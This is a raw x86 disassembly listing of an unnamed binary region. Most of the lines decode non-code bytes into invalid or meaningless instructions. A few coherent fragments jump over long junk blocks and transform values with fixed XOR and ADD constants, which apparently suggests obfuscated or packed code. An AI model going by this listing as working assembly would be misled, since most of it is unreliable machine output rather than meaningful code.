  410833:	shl    DWORD PTR [esi],cl
  410835:	push   cs
  410836:	xchg   DWORD PTR [edi+ebx*4],esi
  410839:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41083a:	xor    DWORD PTR [esi+ecx*4+0x65],eax
  41083e:	push   ecx
  41083f:	dec    esp
  410840:	cmp    cl,BYTE PTR [edi+edi*8+0x26]
  410844:	jmp    0xeaddd4c0
  410849:	retf   0xe1bd
  41084c:	mov    bh,0xa0
  41084e:	sbb    ecx,DWORD PTR [ecx]
  410850:	dec    edi
  410851:	xor    al,0x58
  410853:	jae    0x41088f
  410855:	adc    al,bl
  410857:	mov    dl,0xb6
  410859:	int    0xff
  41085b:	shr    BYTE PTR [eax-0x28],0x24
  41085f:	popf   
  410860:	retf   0x416e
  410863:	mov    cl,0xb8
  410865:	fwait
  410866:	inc    edx
  410867:	mov    esp,0x1d8ae7e
  41086c:	in     al,dx
  41086d:	aam    0x18
  41086f:	out    dx,al
  410870:	mov    esp,ebp
  410872:	dec    ebx
  410873:	xchg   ebx,eax
  410874:	push   esp
  410875:	add    eax,0x855742ea
  41087a:	out    dx,al
  41087b:	cmp    DWORD PTR [eax-0x41bdb5ec],esp
  410881:	out    0x20,eax
  410883:	test   BYTE PTR [ebx],ch
  410885:	call   0xc89b:0x81c2f071
  41088c:	cld    
  41088d:	js     0x41087d
  41088f:	jns    0x410881
  410891:	pop    edi
  410892:	inc    ecx
  410893:	mov    dh,0x1d
  410895:	ss pop esp
  410897:	sbb    BYTE PTR [ecx-0x40],cl
  41089a:	or     eax,0x8f5fd4de
  41089f:	outs   dx,DWORD PTR ds:[esi]
  4108a0:	add    eax,0xed992760
  4108a5:	pop    ss
  4108a6:	mov    edi,0xab1497b9
  4108ab:	sbb    al,0x22
  4108ad:	cmp    DWORD PTR [esi+0x2b086854],ebp
  4108b3:	mov    ebp,0x4be1acf2
  4108b8:	mov    cl,0xae
  4108ba:	enter  0x7389,0xdc
  4108be:	jge    0x41091c
  4108c0:	push   esp
  4108c1:	mov    bl,0xd
  4108c3:	cld    
  4108c4:	dec    esi
  4108c5:	out    0x1f,al
  4108c7:	cmp    esi,DWORD PTR [ebp-0x36]
  4108ca:	(bad)
  4108ce:	ret    
  4108cf:	int3   
  4108d0:	jnp    0x410931
  4108d2:	xor    esp,DWORD PTR [edx]
  4108d4:	aam    0x67
  4108d6:	mov    BYTE PTR [ebp+0x3b42c390],ch
  4108dc:	fbstp  TBYTE PTR [edx+0x723b7834]
  4108e2:	(bad)  
  4108e3:	xchg   esp,eax
  4108e4:	int3   
  4108e5:	shr    esi,1
  4108e7:	test   al,0xdb
  4108e9:	mov    edx,0x728afcf3
  4108ee:	mov    ebx,0x911f3e23
  4108f3:	pop    edx
  4108f4:	stos   DWORD PTR es:[edi],eax
  4108f5:	outs   dx,BYTE PTR ds:[esi]
  4108f6:	add    eax,0xa6884ea6
  4108fb:	aas    
  4108fc:	mov    BYTE PTR [edi+0x77e2eba],cl
  410902:	sbb    ecx,esi
  410904:	push   edi
  410905:	jo     0x4108e9
  410907:	aaa    
  410908:	push   ss
  410909:	sub    DWORD PTR [ebp+0x69],esp
  41090c:	cwde   
  41090d:	je     0x410928
  41090f:	or     eax,0x422d06bc
  410914:	inc    esp
  410915:	leave  
  410916:	ret    
  410917:	out    dx,eax
  410918:	xor    eax,0xc52ad78c
  41091d:	inc    edi
  41091e:	sbb    bl,BYTE PTR [edi+0x1a]
  410921:	test   eax,0x69d92ea1
  410926:	aaa    
  410927:	adc    al,0x55
  410929:	int    0xde
  41092b:	mov    ah,0xf7
  41092d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41092e:	mov    ds:0x57d63b35,al
  410933:	hlt    
  410934:	dec    ecx
  410935:	mov    ebp,0x5ea7b4bf
  41093a:	adc    al,0x44
  41093c:	adc    cl,BYTE PTR [eax+esi*8+0x6c]
  410940:	pusha  
  410941:	xchg   edx,eax
  410942:	xchg   ecx,eax
  410943:	ror    BYTE PTR [ebp+0x36a6e08c],1
  410949:	pop    edi
  41094a:	xchg   DWORD PTR [esi],esi
  41094c:	(bad)
  410950:	std    
  410951:	adc    esp,DWORD PTR [esi+ecx*8+0x8612ea]
  410958:	mov    WORD PTR [ecx-0x74e97d8f],gs
  41095e:	(bad)  
  410960:	loopne 0x41097b
  410962:	mul    DWORD PTR [ebp+0x13]
  410965:	pop    ecx
  410966:	dec    eax
  410967:	pop    ebx
  410968:	push   ds
  410969:	rcr    DWORD PTR [edx],1
  41096b:	mov    BYTE PTR [edx+0x1b54667e],dh
  410971:	in     al,0xce
  410973:	xchg   esp,eax
  410974:	pop    eax
  410975:	pop    edi
  410976:	stos   DWORD PTR es:[edi],eax
  410977:	call   0xf509:0xa3e74338
  41097e:	jmp    0xd3d8:0xe528282b
  410985:	or     BYTE PTR [eax],ch
  410987:	data16 mov dl,bh
  41098a:	dec    edi
  41098b:	xchg   ebx,eax
  41098c:	dec    eax
  41098d:	push   eax
  41098e:	jb     0x4109d2
  410990:	cwde   
  410991:	dec    ebp
  410992:	xlat   BYTE PTR ds:[ebx]
  410993:	sti    
  410994:	test   eax,0x35bbaa8c
  410999:	mov    edx,DWORD PTR ds:0x3fdd1d38
  41099f:	scas   eax,DWORD PTR es:[edi]
  4109a0:	aaa    
  4109a1:	sar    DWORD PTR [ebx+edx*8+0x7b],cl
  4109a5:	rcl    DWORD PTR gs:[eax],0x50
  4109a9:	mov    esp,0x1de32968
  4109ae:	cld    
  4109af:	inc    esi
  4109b0:	sub    BYTE PTR [esi+0xc],dl
  4109b3:	lahf   
  4109b4:	jl     0x410a07
  4109b6:	test   DWORD PTR [eax],edi
  4109b8:	aas    
  4109b9:	call   FWORD PTR [edx+0x2e1085f2]
  4109bf:	mov    ecx,0x3c16defe
  4109c4:	inc    esi
  4109c5:	(bad)  
  4109c6:	call   0xef7daad1
  4109cb:	push   edi
  4109cc:	jl     0x4109c0
  4109ce:	ja     0x410964
  4109d0:	cmp    ecx,DWORD PTR [ebp+0xcebb3e8]
  4109d6:	dec    eax
  4109d7:	inc    ebp
  4109d8:	test   ch,dl
  4109da:	popa   
  4109db:	dec    edi
  4109dc:	pop    ebx
  4109dd:	mov    ss,WORD PTR [ecx]
  4109df:	xchg   edx,eax
  4109e0:	mov    ah,ah
  4109e2:	(bad)  
  4109e3:	test   eax,0x6624315d
  4109e8:	and    DWORD PTR [ebp-0x26],edx
  4109eb:	and    DWORD PTR [esi-0x70],0xd50617da
  4109f2:	bound  ebx,QWORD PTR [ebx+0x6e]
  4109f5:	push   ds
  4109f6:	mov    ds:0x67cfd68b,al
  4109fb:	xor    BYTE PTR [ebx-0x25],ah
  4109fe:	in     eax,dx
  4109ff:	pop    esp
  410a00:	dec    BYTE PTR [edx-0x64ea17]
  410a06:	push   0x46b23c15
  410a0b:	sar    BYTE PTR [ecx],cl
  410a0d:	out    dx,al
  410a0e:	or     al,ch
  410a10:	jns    0x410a78
  410a12:	add    eax,0x8bbf1504
  410a17:	(bad)  
  410a18:	fnstcw WORD PTR [edx]
  410a1a:	or     DWORD PTR [esi-0x20613287],edx
  410a20:	(bad)  
  410a21:	xor    ebx,DWORD PTR [ecx+0x2e]
  410a24:	push   edi
  410a25:	mov    bl,0x51
  410a27:	call   0x8d5adf8b
  410a2c:	push   esi
  410a2d:	add    DWORD PTR [esi],0xbc54c19d
  410a33:	mov    eax,ds:0x7fde93ac
  410a38:	hlt    
  410a39:	outs   dx,BYTE PTR ds:[esi]
  410a3a:	sbb    DWORD PTR [ebx+0x2c82504c],edx
  410a40:	cmp    BYTE PTR [ebp-0x43afeca5],ch
  410a46:	nop
  410a47:	adc    al,0x55
  410a49:	jo     0x4109fc
  410a4b:	and    al,0xf5
  410a4d:	(bad)  
  410a4e:	sub    eax,0xc2536c3f
  410a53:	std    
  410a54:	push   0x9918db2a
  410a59:	icebp  
  410a5a:	or     DWORD PTR [ebp+0x107e8578],esp
  410a60:	sub    cl,dh
  410a62:	das    
  410a63:	mov    cl,0xa1
  410a65:	mov    cl,0xcc
  410a67:	jns    0x4109ec
  410a69:	and    al,BYTE PTR [ebp+0x3e6f183d]
  410a6f:	not    DWORD PTR [ebp+0x48]
  410a72:	out    dx,al
  410a73:	sub    bl,0x46
  410a76:	dec    edx
  410a77:	pop    eax
  410a78:	jb     0x410a1d
  410a7a:	push   esi
  410a7b:	call   0xae4e:0x8aae2b0f
  410a82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a83:	sub    ebp,esi
  410a85:	arpl   WORD PTR [ebx-0x52],di
  410a88:	pop    esi
  410a89:	xchg   ecx,eax
  410a8a:	cmp    BYTE PTR [esi],dh
  410a8c:	push   esp
  410a8d:	shl    edx,0xc7
  410a90:	sub    esi,ebp
  410a92:	ja     0x410a4b
  410a94:	xor    BYTE PTR fs:[eax+0x3edb52d3],ch
  410a9b:	cmp    eax,DWORD PTR [ecx]
  410a9d:	mov    ah,0x97
  410a9f:	loope  0x410a4d
  410aa1:	and    ebp,DWORD PTR [ebx+0x3c]
  410aa4:	shl    cl,0x12
  410aa7:	(bad)  
  410aa8:	cld    
  410aa9:	adc    BYTE PTR ds:0x460004fa,al
  410aaf:	adc    esp,esi
  410ab1:	mov    edx,0x15036731
  410ab6:	sahf   
  410ab7:	mov    eax,ds:0xe5ec6372
  410abc:	call   0xe1fc:0xe22abb21
  410ac3:	dec    ebp
  410ac4:	stc    
  410ac5:	mov    ds:0xa794680f,eax
  410aca:	(bad)  
  410acb:	xchg   ebx,eax
  410acc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410acd:	sbb    esp,DWORD PTR [ebx]
  410acf:	jbe    0x410a5d
  410ad1:	mov    WORD PTR [edi-0x5],cs
  410ad4:	mov    dl,BYTE PTR [edi+0x3d]
  410ad7:	cmp    eax,0xe72c87dd
  410adc:	icebp  
  410add:	in     al,0xa7
  410adf:	setge  ch
  410ae2:	repnz aad 0x9f
  410ae5:	xchg   esi,eax
  410ae6:	imul   edi,DWORD PTR [eax],0x56
  410ae9:	push   ss
  410aea:	jb     0x410a9d
  410aec:	ds jno 0x410aa8
  410aef:	es pop edi
  410af1:	and    eax,0x516bb841
  410af6:	fisub  WORD PTR [edi+0x679bb52]
  410afc:	mov    cl,0x8c
  410afe:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  410b00:	ins    BYTE PTR es:[edi],dx
  410b01:	pop    esp
  410b02:	pop    edx
  410b03:	dec    ebx
  410b04:	test   DWORD PTR [edi+0x23ac7007],edi
  410b0a:	mov    es,WORD PTR [ebp-0x1f11627d]
  410b10:	fs adc esp,esi
  410b13:	sub    al,0x60
  410b15:	in     eax,dx
  410b16:	sahf   
  410b17:	retf   
  410b18:	mov    cl,0x7e
  410b1a:	dec    ecx
  410b1b:	xchg   esp,eax
  410b1c:	(bad)  
  410b1d:	fldcw  WORD PTR [edx-0x28]
  410b20:	pop    ecx
  410b21:	stos   DWORD PTR es:[edi],eax
  410b22:	pusha  
  410b23:	dec    ebx
  410b24:	xchg   esi,eax
  410b25:	or     eax,eax
  410b27:	ret    0xa98c
  410b2a:	sub    eax,0xd8a3e79c
  410b2f:	mov    BYTE PTR [eiz*4-0x72dd5db9],bh
  410b36:	gs rcr edi,0x2d
  410b3a:	out    0x35,eax
  410b3c:	and    BYTE PTR [eax],al
  410b3e:	hlt    
  410b3f:	sar    DWORD PTR [ebp+0x6a],0xc8
  410b43:	fidivr DWORD PTR [ebx+ecx*4]
  410b46:	mov    ebp,0x3efeeb85
  410b4b:	inc    edx
  410b4c:	in     al,dx
  410b4d:	repz push 0xffffff88
  410b50:	cmp    esi,DWORD PTR [edi+0x5f]
  410b53:	xor    DWORD PTR [edx+0x6c],ebp
  410b56:	ds mov ebp,0xa0b3348e
  410b5c:	cmp    DWORD PTR [ecx+0x3932b5d8],esp
  410b62:	inc    esi
  410b63:	push   esp
  410b64:	pop    esi
  410b65:	je     0x410b73
  410b6b:	mov    eax,DWORD PTR [ebp+0x8]
  410b6e:	jmp    0x410b8c
  410b73:	mov    eax,DWORD PTR [ebp-0x4]
  410b76:	xor    eax,edx
  410b78:	add    eax,ecx
  410b7a:	jmp    0x410b8c
  410b7f:	mov    eax,DWORD PTR [ebp-0x4]
  410b82:	xor    eax,0x7510855
  410b87:	add    eax,0x32729c
  410b8c:	leave  
  410b8d:	ret    0x4
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	jmp    0x410f98
  410b98:	outs   dx,DWORD PTR ds:[esi]
  410b99:	mov    WORD PTR ds:0x7191e994,cs
  410b9f:	jae    0x410bc2
  410ba1:	dec    esi
  410ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba3:	repz jp 0x410b40
  410ba6:	push   ecx
  410ba7:	idiv   BYTE PTR [esi]
  410ba9:	inc    edx
  410baa:	jo     0x410c1c
  410bac:	pop    eax
  410bad:	jge    0x410c1f
  410baf:	jo     0x410c02
  410bb1:	lock mov ah,0x61
  410bb4:	jb     0x410b56
  410bb6:	mov    bl,0x96
  410bb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bb9:	add    BYTE PTR [eax],0xfe
  410bbc:	push   edi
  410bbd:	mov    al,0x26
  410bbf:	sbb    DWORD PTR [eax-0x13],esi
  410bc2:	push   edx
  410bc3:	add    DWORD PTR [eax],edi
  410bc5:	jmp    0x16d1f616
  410bca:	push   0x7
  410bcc:	adc    edi,DWORD PTR [ecx-0x4f34985e]
  410bd2:	stos   DWORD PTR es:[edi],eax
  410bd3:	inc    ecx
  410bd4:	aas    
  410bd5:	clc    
  410bd6:	aam    0x83
  410bd8:	mov    cl,0x2
  410bda:	push   ds
  410bdb:	add    edi,DWORD PTR [ebp-0x43366c05]
  410be1:	sub    DWORD PTR [ebp+0x6795d008],ecx
  410be7:	mov    al,0x5d
  410be9:	arpl   cx,bp
  410beb:	add    dh,BYTE PTR [ecx+0x7169deb5]
  410bf1:	out    0x51,eax
  410bf3:	dec    ebx
  410bf4:	hlt    
  410bf5:	jo     0x410bb6
  410bf7:	addr16 hlt 
  410bf9:	ret    0xe96c
  410bfc:	sbb    edi,esi
  410bfe:	mov    ebx,0x260d0bac
  410c03:	xchg   DWORD PTR [edx-0x3360cde],esi
  410c09:	jno    0x410c02
  410c0b:	dec    ecx
  410c0c:	sub    ecx,DWORD PTR [ebx]
  410c0e:	nop
  410c0f:	imul   eax,DWORD PTR [esi-0x6875ad4],0x1570e83b
  410c19:	push   ecx
  410c1a:	cmp    BYTE PTR [edx],ch
  410c1c:	sub    esi,ebx
  410c1e:	pop    edi
  410c1f:	stos   BYTE PTR es:[edi],al
  410c20:	test   BYTE PTR [edx],0x2c
  410c23:	fwait
  410c24:	push   ebp
  410c25:	call   0xe418e185
  410c2a:	aaa    
  410c2b:	add    ch,al
  410c2d:	xor    eax,0x8b3c00e8
  410c32:	xor    ch,bh
  410c34:	pop    esi
  410c35:	arpl   WORD PTR [edi-0x7c],cx
  410c38:	(bad)
  410c3b:	mov    ds:0x49c791d5,eax
  410c40:	arpl   WORD PTR [ebp+0x28],ax
  410c43:	inc    ebp
  410c44:	pushf  
  410c45:	bound  esp,QWORD PTR [edi]
  410c47:	xchg   esi,eax
  410c48:	cmp    DWORD PTR [esi],0xad030e19
  410c4e:	xlat   BYTE PTR ds:[ebx]
  410c4f:	nop
  410c50:	es popa 
  410c52:	stos   BYTE PTR es:[edi],al
  410c53:	popf   
  410c54:	inc    esi
  410c55:	jno    0x410cb0
  410c57:	and    eax,0x1e45ed91
  410c5c:	mov    edx,0x280fa5df
  410c61:	dec    esi
  410c62:	jmp    0x410c3d
  410c64:	mov    ch,0x7d
  410c66:	sub    al,0xfc
  410c68:	xchg   DWORD PTR [esi+0x4e52e15b],edx
  410c6e:	data16 mov ds,WORD PTR [ecx+0x11]
  410c72:	loopne 0x410c98
  410c74:	call   0xb3ee:0x63de6e49
  410c7b:	loopne 0x410c6f
  410c7d:	div    DWORD PTR [ecx+0x61]
  410c80:	cmp    DWORD PTR [edi+0x443f7bf7],edx
  410c86:	mov    esp,0xa145d263
  410c8b:	adc    DWORD PTR [eax],esi
  410c8d:	xchg   ecx,eax
  410c8e:	and    al,ch
  410c90:	add    BYTE PTR [ecx-0x65],0x5e
  410c94:	mov    dh,0x4a
  410c96:	cmp    DWORD PTR [ebx+0x63e44dda],ebp
  410c9c:	mov    dh,0x36
  410c9e:	nop
  410c9f:	pop    ebp
  410ca0:	ret    
  410ca1:	shl    BYTE PTR [edi-0x1d],cl
  410ca4:	xchg   DWORD PTR [eax],ebp
  410ca6:	and    al,0x1d
  410ca8:	and    eax,DWORD PTR [ebp-0x5b]
  410cab:	mov    WORD PTR [ebx+0x5d0a04f7],gs
  410cb1:	xchg   DWORD PTR [edx+0x24e323ff],ecx
  410cb7:	sbb    cl,BYTE PTR [edx+0x12]
  410cba:	sub    al,0xc2
  410cbc:	sbb    BYTE PTR [ebp+0x23c50aa2],0x87
  410cc3:	mov    ds:0x1a45536b,eax
  410cc8:	popf   
  410cc9:	bound  eax,QWORD PTR [edx+0x7d]
  410ccc:	daa    
  410ccd:	pop    esp
  410cce:	inc    edx
  410ccf:	lods   al,BYTE PTR ds:[esi]
  410cd0:	mov    ds:0xafa33760,al
  410cd5:	mov    eax,edx
  410cd7:	cmp    DWORD PTR [ecx-0x58],0x1c
  410cdb:	sub    al,0x7d
  410cdd:	jnp    0x410cf6
  410cdf:	call   0xe460:0x310154fe
  410ce6:	arpl   WORD PTR [ebx-0x33b18693],si
  410cec:	add    ah,ch
  410cee:	arpl   WORD PTR [edx],dx
  410cf0:	lds    esi,FWORD PTR [edi+0x30]
  410cf3:	mov    cl,0xf9
  410cf5:	inc    ebp
  410cf6:	and    ebx,DWORD PTR [edx-0x45]
  410cf9:	cmp    esp,DWORD PTR [edi-0x4b23dd08]
  410cff:	mov    cl,0xf4
  410d01:	pop    edx
  410d02:	push   eax
  410d03:	out    dx,eax
  410d04:	sbb    bh,BYTE PTR [ecx+0xe]
  410d07:	xor    eax,0xdd76fe9c
  410d0c:	add    dl,BYTE PTR [ebx+0x7d]
  410d0f:	adc    eax,0xd28ff8a7
  410d14:	jmp    0xec44:0x75484a40
  410d1b:	or     BYTE PTR [edi+ecx*1],dl
  410d1e:	mov    edx,0xaa558d06
  410d23:	mov    bh,0xd2
  410d25:	popf   
  410d26:	pusha  
  410d27:	adc    BYTE PTR ds:0xbffe37ff,dl
  410d2d:	leave  
  410d2e:	cmp    eax,0x790fbb4d
  410d33:	adc    BYTE PTR [eax],dh
  410d35:	test   DWORD PTR [edx-0xb7c08b7],ecx
  410d3b:	or     al,0xb
  410d3d:	pop    edi
  410d3e:	in     al,0x1f
  410d40:	out    0x82,al
  410d42:	bound  esp,QWORD PTR [ebx+eax*2+0x119ffd82]
  410d49:	jl     0x410d24
  410d4b:	clc    
  410d4c:	sub    dh,dl
  410d4e:	cmp    DWORD PTR [edi],ebp
  410d50:	fisubr DWORD PTR [esi]
  410d52:	aad    0x47
  410d54:	cdq    
  410d55:	(bad)  
  410d56:	xor    BYTE PTR [edx+ebx*8+0x6be4066],ch
  410d5d:	retf   
  410d5e:	test   DWORD PTR [ebp+0x67],0xc3e52f5b
  410d65:	lods   al,BYTE PTR ds:[esi]
  410d66:	test   eax,0xe87522a4
  410d6b:	fmul   QWORD PTR ds:0xa662f2c0
  410d72:	jmp    0x30eb:0x7a3ca817
  410d79:	je     0x410d80
  410d7b:	sub    DWORD PTR [ecx-0x54df41ed],ecx
  410d81:	(bad)  
  410d83:	inc    edx
  410d84:	sar    BYTE PTR [ebx],1
  410d86:	retf   
  410d87:	fadd   st,st(0)
  410d89:	or     al,0x7a
  410d8b:	inc    eax
  410d8c:	jg     0x410d97
  410d8e:	inc    ebp
  410d8f:	imul   edi,DWORD PTR [ebp-0x1c],0x1775a5e3
  410d96:	in     eax,0xbd
  410d98:	jb     0x410d28
  410d9a:	in     eax,0x61
  410d9c:	pop    eax
  410d9d:	(bad)  
  410d9f:	in     eax,0xe3
  410da1:	aam    0x4e
  410da3:	jae    0x410d8f
  410da5:	mov    WORD PTR [edi],?
  410da7:	inc    esi
  410da8:	add    dl,ch
  410daa:	stc    
  410dab:	sbb    DWORD PTR [ecx-0x32],ebx
  410dae:	sub    BYTE PTR [edi+0x73],ah
  410db1:	ss (bad) 
  410db3:	pop    eax
  410db4:	jns    0x410d3c
  410db6:	sti    
  410db7:	sbb    DWORD PTR [edx],edi
  410db9:	adc    BYTE PTR [esi+esi*8],cl
  410dbc:	or     DWORD PTR [ebx+0x1a],0x3d
  410dc0:	mov    al,0x9b
  410dc2:	jecxz  0x410dcc
  410dc4:	pop    ds
  410dc5:	ds pushf 
  410dc7:	lds    esp,FWORD PTR [esi+0x715fc7b2]
  410dcd:	jno    0x410ddc
  410dcf:	jmp    0x410e30
  410dd1:	shr    BYTE PTR [ecx+0x755e0b6f],0x1f
  410dd8:	mov    ah,0x59
  410dda:	fs jl  0x410e49
  410ddd:	or     edi,DWORD PTR [ecx]
  410ddf:	sub    edx,esp
  410de1:	ss es shl ecx,1
  410de5:	sar    DWORD PTR [esi-0x13],0xb1
  410de9:	cld    
  410dea:	call   0x1102:0xe632dd18
  410df1:	rcr    BYTE PTR [eax-0x352cad00],0xf7
  410df8:	sbb    al,0x7
  410dfa:	pop    DWORD PTR [edi+0x1e]
  410dfd:	push   esp
  410dfe:	lea    ebp,[eax]
  410e00:	int    0x19
  410e02:	ds xchg esp,eax
  410e04:	pop    ebx
  410e05:	test   al,0x31
  410e08:	or     esp,DWORD PTR [esp+eax*4-0x4bed4536]
  410e0f:	stos   BYTE PTR es:[edi],al
  410e10:	xchg   ebx,eax
  410e11:	iret   
  410e12:	cmp    esp,ecx
  410e14:	push   ds
  410e15:	cmp    ebp,DWORD PTR [ebx-0x3c]
  410e18:	and    BYTE PTR [edi-0x2f],ch
  410e1b:	jg     0x410dcc
  410e1d:	push   cs
  410e1e:	lods   eax,DWORD PTR ds:[esi]
  410e1f:	lods   al,BYTE PTR ds:[esi]
  410e20:	sub    DWORD PTR [esi],0xcada7484
  410e26:	nop
  410e27:	pop    ss
  410e28:	sub    BYTE PTR [ebx],bl
  410e2a:	jge    0x410e60
  410e2c:	mov    ebx,0x7536e9de
  410e31:	ins    BYTE PTR es:[edi],dx
  410e32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e33:	call   0x91a6:0x393f5269
  410e3a:	mov    eax,0xce37df28
  410e3f:	push   esi
  410e40:	stos   DWORD PTR es:[edi],eax
  410e41:	int    0x65
  410e43:	mov    ah,0xa0
  410e45:	stos   BYTE PTR es:[edi],al
  410e46:	pop    ecx
  410e47:	pop    esi
  410e48:	and    al,0x9a
  410e4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e4b:	jmp    0x18c0b433
  410e50:	adc    ch,bl
  410e52:	push   eax
  410e53:	xchg   esp,eax
  410e54:	mov    dl,bh
  410e56:	sub    esp,DWORD PTR [eax-0x2c]
  410e59:	sbb    eax,0x5bd1095d
  410e5e:	lods   al,BYTE PTR ds:[esi]
  410e5f:	test   al,0x5e
  410e61:	ret    0x54f7
  410e64:	daa    
  410e65:	lahf   
  410e66:	(bad)  
  410e68:	fist   WORD PTR [eax-0x27588364]
  410e6e:	mov    ebx,0x6a7e87b3
  410e73:	pushf  
  410e74:	daa    
  410e75:	leave  
  410e76:	mov    ebx,0x1f0d3392
  410e7b:	addr16 add eax,0x24d0e4b7
  410e81:	adc    BYTE PTR [eax-0x76],0xf2
  410e85:	test   DWORD PTR [edx],esi
  410e87:	ret    0xf511
  410e8a:	pop    edx
  410e8b:	ins    DWORD PTR es:[edi],dx
  410e8c:	and    DWORD PTR [edx],edi
  410e8e:	das    
  410e8f:	add    DWORD PTR [edi],0xffffffbc
  410e92:	or     ch,BYTE PTR [eax+0x5e2ee2e3]
  410e98:	call   DWORD PTR [edx+0x549289f]
  410e9e:	xlat   BYTE PTR ds:[ebx]
  410e9f:	push   ss
  410ea0:	pop    ebx
  410ea1:	xchg   esp,eax
  410ea2:	mov    ebp,DWORD PTR [ebx+0x69]
  410ea5:	fs in  al,dx
  410ea7:	mov    edx,0x80ded5bf
  410eac:	xchg   esp,eax
  410ead:	jg     0x410e30
  410eaf:	scas   al,BYTE PTR es:[edi]
  410eb0:	sub    ah,BYTE PTR [ebp+0x52e030ab]
  410eb6:	adc    cl,BYTE PTR [ecx-0x62]
  410eb9:	int3   
  410eba:	pushf  
  410ebb:	inc    DWORD PTR [ebp+edx*1+0x5e]
  410ebf:	inc    ebp
  410ec0:	aad    0x18
  410ec2:	(bad)  
  410ec4:	into   
  410ec5:	sbb    al,0x22
  410ec7:	dec    edi
  410ec8:	xor    BYTE PTR [eax+0x6f],0x32
  410ecc:	sar    DWORD PTR [ecx-0x4f],0xec
  410ed0:	jecxz  0x410f1b
  410ed2:	stos   DWORD PTR es:[edi],eax
  410ed3:	cmp    eax,esi
  410ed5:	pop    ds
  410ed6:	mov    ch,0x54
  410ed8:	call   0x74e9:0xb81d289d
  410edf:	clc    
  410ee0:	jae    0x410f1e
  410ee2:	push   ecx
  410ee3:	rcr    esi,0x14
  410ee6:	(bad)  
  410ee7:	scas   eax,DWORD PTR es:[edi]
  410ee8:	fwait
  410ee9:	mov    cl,0xb2
  410eeb:	add    eax,DWORD PTR [esi]
  410eed:	test   dl,al
  410eef:	sub    al,0x68
  410ef1:	loop   0x410f26
  410ef3:	std    
  410ef4:	repz loope 0x410f19
  410ef7:	jp     0x410e95
  410ef9:	sbb    esp,DWORD PTR [edi]
  410efb:	pop    esp
  410efc:	or     ebx,DWORD PTR [esi+0x72]
  410eff:	dec    ebp
  410f00:	sbb    BYTE PTR [eax],0x2c
  410f03:	push   edi
  410f04:	sbb    DWORD PTR [eax-0x49],esp
  410f07:	adc    cl,BYTE PTR [edx+0x49]
  410f0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f0b:	cld    
  410f0c:	fild   QWORD PTR [esi+0x7c]
  410f0f:	ret    0xdfd4
  410f12:	lock icebp 
  410f14:	in     eax,0xb8
  410f16:	xor    BYTE PTR [ebp+0x36276088],0xb3
  410f1d:	xchg   al,cl
  410f1f:	das    
  410f20:	xchg   edi,eax
  410f21:	xchg   BYTE PTR [eax],dh
  410f23:	sbb    BYTE PTR [edx+0x7df2aec9],dh
  410f29:	sbb    DWORD PTR [edx-0x1c],ecx
  410f2c:	pop    ecx
  410f2d:	push   esi
  410f2e:	cmp    al,BYTE PTR [ecx+0x7179c8e]
  410f34:	out    dx,eax
  410f35:	sbb    BYTE PTR [ebx+0x1307ef4b],al
  410f3b:	ins    DWORD PTR es:[edi],dx
  410f3c:	fs sbb al,0x50
  410f3f:	(bad)  
  410f40:	push   esi
  410f41:	inc    edi
  410f42:	push   eax
  410f43:	sbb    cl,BYTE PTR [esi+0x23]
  410f46:	jl     0x410efd
  410f48:	pusha  
  410f49:	out    0xa5,al
  410f4b:	mov    BYTE PTR [eax+eiz*4-0x53],ah
  410f4f:	push   ebx
  410f50:	dec    esp
  410f51:	mov    esp,0xa0ece1e2
  410f56:	xchg   edx,eax
  410f57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f58:	arpl   ax,dx
  410f5a:	or     ecx,DWORD PTR [ecx-0x1558ae80]
  410f60:	jo     0x410f8f
  410f62:	popf   
  410f63:	pop    es
  410f64:	mov    edx,0x59651380
  410f69:	fsub   st(3),st
  410f6b:	lods   eax,DWORD PTR ds:[esi]
  410f6c:	imul   edx,esp,0x42d040fe
  410f72:	inc    esi
  410f73:	aas    
  410f74:	fiadd  DWORD PTR [esi-0x3851f1ca]
  410f7a:	xchg   esp,eax
  410f7b:	(bad)  
  410f7c:	push   edi
  410f7d:	fld    QWORD PTR [ebx]
  410f7f:	and    ebx,DWORD PTR ds:[ebp+edi*8+0x191e4d21]
  410f87:	mov    esi,DWORD PTR [edi]
  410f89:	inc    BYTE PTR [edx]
  410f8b:	fwait
  410f8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f8d:	loopne 0x410f1d
  410f8f:	call   FWORD PTR [edi]
  410f91:	dec    eax
  410f92:	xor    al,0x5d
  410f94:	in     al,dx
  410f95:	push   esp
  410f96:	aad    0xf5
  410f98:	mov    eax,ds:0x41b22c
  410f9d:	mov    edx,0x32729c
  410fa2:	sub    eax,edx
  410fa4:	adc    DWORD PTR ds:0x42fd6e,ebx
  410faa:	mov    ecx,0x7510855
  410faf:	push   esi
  410fb0:	mov    esi,DWORD PTR [ebp+0xc]
  410fb3:	xor    eax,ecx
  410fb5:	mov    DWORD PTR ds:0x42e11c,0x4b31
  410fbf:	jmp    0x4113c4
  410fc4:	xchg   edx,eax
  410fc5:	shl    DWORD PTR [edi+eiz*8+0x71516771],cl
  410fcc:	push   ebp
  410fcd:	paddsw mm6,QWORD PTR [eax-0x3e347224]
  410fd4:	es dec esi
  410fd6:	jo     0x411048
  410fd8:	pop    eax
  410fd9:	jge    0x41104b
  410fdb:	jo     0x410f7c
  410fdd:	lahf   
  410fde:	push   ebx
  410fdf:	mov    bl,0x81
  410fe1:	lds    ecx,FWORD PTR [ecx-0x22]
  410fe4:	push   0xfffffff3
  410fe6:	mov    esp,0x4834ad8
  410feb:	or     al,0x7e
  410fed:	repz and BYTE PTR [eax+ebp*8],cl
  410ff1:	cdq    
  410ff2:	int3   
  410ff3:	fbld   TBYTE PTR [esi-0x10]
  410ff6:	in     eax,dx
  410ff7:	loope  0x410fc6
  410ff9:	jnp    0x411020
  410ffb:	js     0x41102c
  410ffd:	(bad)  
